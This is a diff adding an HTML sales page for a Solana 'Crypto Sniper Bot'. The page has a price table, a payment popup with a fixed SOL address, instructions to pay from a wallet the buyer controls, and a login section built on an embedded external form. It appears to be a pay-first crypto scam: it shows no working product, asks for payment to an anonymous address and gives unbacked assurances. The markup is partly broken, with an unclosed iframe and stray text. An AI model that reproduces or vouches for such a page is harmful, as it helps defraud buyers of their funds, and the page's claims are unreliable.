@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sniper Bot - Kripto Botu</title>
+    <style>
+        /* Genel stil */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1c1c1c;
+            color: white;
+        }
+
+        /* Navbar stil */
+        nav {
+            background-color: #333;
+            padding: 15px;
+            text-align: center;
+        }
+
+        nav a {
+            color: white;
+            text-decoration: none;
+            margin: 0 20px;
+            font-size: 18px;
+        }
+
+        nav a:hover {
+            color: #ff5722;
+        }
+
+        /* Ana içerik alanı */
+        .content {
+            padding: 40px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            padding: 12px 20px;
+            font-size: 18px;
+            background-color: #ff5722;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .btn:hover {
+            background-color: #e64a19;
+        }
+
+        /* Footer */
+        footer {
+            background-color: #333;
+            padding: 10px;
+            text-align: center;
+            color: white;
+            margin-top: 50px;
+        }
+
+        /* Formsmarts Embed */
+        .fs_embed {
+            height: 850px;
+            width: 90%;
+            border: none;
+            max-width: 440px;
+            margin-top: 20px;
+            border-radius: 8px;
+        }
+
+        /* İçerik bölümü */
+        .features {
+            display: flex;
+            justify-content: center;
+            margin-top: 50px;
+        }
+
+        .feature-box {
+            background-color: #2c2f36;
+            padding: 20px;
+            margin: 0 20px;
+            width: 250px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .feature-box h3 {
+            font-size: 24px;
+            color: #ff5722;
+        }
+
+        .feature-box p {
+            font-size: 16px;
+            color: #aaa;
+        }
+
+        /* Mobile uyumlu */
+        @media (max-width: 768px) {
+            .features {
+                flex-direction: column;
+            }
+
+            .feature-box {
+                margin-bottom: 20px;
+                width: 100%;
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- Navbar -->
+    <nav>
+        <a href="#home">🏠Home</a>
+        <a href="#features">💰Prices</a>
+        <a href="#login">Snıper</a>
+    </nav>
+
+    <!-- Ana içerik -->
+    <div class="content" id="home">
+        <img width="86" height="86" src="https://sniperpump.fun/mevbotsniper/2025/02/cropped-logo-86x86.png" class="custom-logo" alt="PumpFun Sniper bot" decoding="async" srcset="https://sniperpump.fun/mevbotsniper/2025/02/cropped-logo-86x86.png 86w, https://sniperpump.fun/mevbotsniper/2025/02/cropped-logo-300x300.png 300w, https://sniperpump.fun/mevbotsniper/2025/02/cropped-logo-150x150.png 150w, https://sniperpump.fun/mevbotsniper/2025/02/cropped-logo.png 512w" sizes="(max-width: 86px) 100vw, 86px">
+        <h1>Crypto Sniper Bot</h1>
+        <p>Analyze your crypto markets and make automatic buy/sell transactions.</p>
+        <button class="btn" onclick="window.location.href='#login'">SNIPERBOT</button>
+        <div id="pgc-68-0-1" class="panel-grid-cell"><div id="panel-68-0-1-0" class="widget_text so-panel widget widget_custom_html panel-first-child" data-index="1"><div class="textwidget custom-html-widget"><div id="prices" class="content-section">
+    <div class="table-container">
+        <table>
+            <thead>
+                <tr>
+                    <th>Duration</th>
+                    <th>Price</th>
+                    <th>Transaction Fee</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>1 hour</td>
+                    <td>0.2 SOL</td>
+                    <td>4%</td>
+                    <td><button onclick="openPaymentPopup()" style="background: #34db9a; color: black; padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">BUY</button></td>
+                </tr>
+                <tr>
+                    <td>6 hours</td>
+                    <td>0.5 SOL</td>
+                    <td>3%</td>
+                    <td><button onclick="openPaymentPopup()" style="background: #34db9a; color: black; padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">BUY</button></td>
+                </tr>
+                <tr>
+                    <td>1 Day</td>
+                    <td>1 SOL</td>
+                    <td>2%</td>
+                    <td><button onclick="openPaymentPopup()" style="background: #34db9a; color: black; padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">BUY</button></td>
+                </tr>
+                <tr>
+                    <td>7 Days</td>
+                    <td>2 SOL</td>
+                    <td>1%</td>
+                    <td><button onclick="openPaymentPopup()" style="background: #34db9a; color: black; padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">BUY</button></td>
+                </tr>
+                <tr>
+                    <td>15 Days</td>
+                    <td>3 SOL</td>
+                    <td>0.5%</td>
+                    <td><button onclick="openPaymentPopup()" style="background: #34db9a; color: black; padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">BUY</button></td>
+                </tr>
+                <tr>
+                    <td>30 Days</td>
+                    <td>4 SOL</td>
+                    <td>0.0%</td>
+                    <td><button onclick="openPaymentPopup()" style="background: #34db9a; color: black; padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">BUY</button></td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+    <div id="overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); z-index: 999;"></div>
+    <div id="paymentPopup">
+        <img decoding="async" src="https://statics.solscan.io/solscan-img/solana_icon.svg" alt="Solana Logo">
+        <h3>SOLANA PAYMENT DETAILS</h3>
+        <div>
+            <input type="text" id="solAddress" value="9btN5riVYekdf2rmXsj9MC8WSVbJYnH9CkCH4Pfw9aPL" readonly="">
+            <button onclick="copySolAddress()">COPY</button>
+        </div>
+        <p id="copyNotification" style="display: none; color: #00ff00;">✅ SOL ADDRESS COPIED.</p>
+        <p style="color: #ffaaaa;">Before you pay, read the information below.</p>
+        <p>
+            ✅ <strong>After you pay</strong>, your SOL address will be upgraded automatically.<br>
+            ✅ <strong>Use your Solana address</strong> from which you made the payment.<br>
+            ✅ <strong>Send the EXACT amount</strong> as listed in the prices.<br>
+            ❌ <strong>Do not pay</strong> from someone else's account.<br>
+            ❌ <strong>Pay from your own account</strong>, with private key access.<br>
+        </p>
+        <p style="color: #ffaaaa;">!! IMPORTANT !! If you send from another account, that account will have access to the sniper bot.</p>
+        <p><a class="telegram-link" href="https://t.me/sniperpump_fun" target="_blank">
+            <i class="fa-solid fa-comment-dots"></i> Telegram: @sniperpump_fun
+        </a></p>
+        <button class="close-btn" onclick="closePaymentPopup()">CLOSE</button>
+    </div>
+</div>
+<style>
+    /* Stiluri generale */
+    #prices {
+        font-family: Arial, sans-serif;
+        color: white;
+        background-color: #1e1e1e;
+        padding: 20px;
+        border-radius: 10px;
+    }
+    .table-container {
+        overflow-x: auto;
+    }
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 20px 0;
+        background-color: #2b2b2b;
+        border-radius: 10px;
+        overflow: hidden;
+    }
+    th, td {
+        padding: 15px;
+        text-align: center;
+        border-bottom: 1px solid #444;
+    }
+    th {
+        background-color: #e0fff1;
+        color: black;
+        font-weight: bold;
+    }
+    tr:hover {
+        background-color: #3a3a3a;
+        transition: background-color 0.3s ease;
+    }
+    .buy-btn {
+        background-color: #34db9a;
+        color: black;
+        border: none;
+        padding: 10px 15px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-weight: bold;
+        transition: background-color 0.3s ease;
+    }
+    .buy-btn:hover {
+        background-color: #28a078;
+    }
+       /* Stiluri pentru popup */
+          #paymentPopup {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: #2b2b2b;
+    padding: 15px;
+    border-radius: 10px;
+    box-shadow: 0px 0px 15px rgb(51, 219, 154);
+    color: white;
+    text-align: center;
+    z-index: 1000;
+    width: 90%; /* Ocupă 90% din ecran pe mobile */
+    max-height: 90vh; /* Înălțime maximă de 90% din înălțimea ecranului */
+    overflow-y: auto; /* Permite scroll dacă conținutul depășește înălțimea */
+}
+            #paymentPopup img {
+                width: 80px; /* Mai mic pe telefon */
+                height: auto;
+            }
+            #paymentPopup div {
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                background: #1e1e1e;
+                padding: 10px;
+                border-radius: 5px;
+            }
+            #solAddress {
+                width: 100%;
+                background: transparent;
+                border: none;
+                color: #fff;
+                font-weight: bold;
+                text-align: center;
+                font-size: 14px;
+            }
+            button {
+                background: #34db9a;
+                color: black;
+                padding: 8px 12px;
+                border: none;
+                border-radius: 5px;
+                cursor: pointer;
+                font-weight: bold;
+            }
+            /* Butonul de închidere */
+            .close-btn {
+                background: red;
+                color: white;
+                width: 100%;
+                margin-top: 15px;
+                font-size: 16px;
+            }
+            /* Responsivitate */
+            @media (max-width: 480px) {
+                #paymentPopup {
+                    width: 95%;
+                    padding: 10px;
+                }
+                button {
+                    font-size: 14px;
+                    padding: 6px 10px;
+                }
+                .close-btn {
+                    font-size: 14px;
+                }
+            }
+</style>
+<script>
+    function openPaymentPopup() {
+        document.getElementById('paymentPopup').style.display = 'block';
+        document.getElementById('overlay').style.display = 'block';
+    }
+    function closePaymentPopup() {
+        document.getElementById('paymentPopup').style.display = 'none';
+        document.getElementById('overlay').style.display = 'none';
+    }
+    function copySolAddress() {
+        const solAddress = document.getElementById('solAddress');
+        solAddress.select();
+        document.execCommand('copy');
+        const notification = document.getElementById('copyNotification');
+        notification.style.display = 'block';
+        setTimeout(() => {
+            notification.style.display = 'none';
+        }, 2000);
+    }
+</script></div></div><div id="panel-68-0-1-1" class="widget_text so-panel widget widget_custom_html panel-last-child" data-index="2"><div class="textwidget custom-html-widget"><div class="sectionright">
+        <h2>Before you pay, read the information below.</h2>
+         
+        <p style="font-size: 14px; text-align: left; margin-top: 15px;">
+            ✅ <strong>After you pay</strong>, your SOL address will be upgraded automatically in 1-5 minutes and you need to REFRESH THE PAGE BEFORE TRYING AGAIN. We will upgrade the SOL address **from which** we received the payment.<br>
+            ✅ When you start the bot, <strong>use your Solana address</strong> from which you made the payment.<br>
+            ✅ Send the <font color="#a1ffa1">EXACT</font> amount as listed in the prices. <strong>For example, if the package costs <font color="#a1ffa1">2.00 SOL</font>, do not send <font color="#a1ffa1">1.99 SOL</font> or <font color="#a1ffa1">2.01 SOL</font></strong>. If you accidentally send the wrong amount, contact us.<br>
+            ❌ <strong>Do not pay</strong> from someone else's account or from an exchange account.<br>
+            ❌ <strong>Pay from your own account</strong>, one to which you have access to the private key.<br>
+        </p>
+ 
+</div></div></div></div>
+    </div>
+
+    <!-- Bot Özellikleri -->
+    <div class="content" id="features">
+        <h2>Bot Özellikleri</h2>
+        <div class="features">
+            <div class="feature-box">
+                <h3>Fast and Safe</h3>
+                <p>Our bot is optimized for the fastest and safest trading.</p>
+            </div>
+            <div class="feature-box">
+                <h3>Easy to Use</h3>
+                <p>The interface is simple and user-friendly. You can do it in a few steps.</p>
+            </div>
+            <div class="feature-box">
+                <h3>Works 24/7</h3>
+                <p>Our bot works continuously and does not miss market opportunities.</p>
+            </div>
+        </div> 
+    </div>
+
+    <!-- Giriş Sayfası -->
+    <div class="content" id="login">
+        <h2>Crypto Sniper Bot Login</h2>
+        <form action="login_process.php" method="POST">
+        <iframe class="fs_embed" src="https://formsmarts.com/form/2ekz?mode=h5embed&lay=2" allow="camera; fullscreen; geolocation" allowfullscreen="true" >
+        https://sniperbot.app.tc/sn-per/" title="sniperbot.app.tc">sniperbot.app.tc</a></div></div><!-- Do not change or remove the attribution notice. See https://sniperbot.app.tc/sharp-shooter/ -->
+            <!-- Formsmarts Atıf -->
+    <div class="fs_an">
+        <span>Trading Bot</span>
+    </div>
+
+        </form>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>&copy; 2025 Kripto Sniper Botu. Tüm hakları saklıdır.</p>
+    </footer>
+
+</body>
+</html>
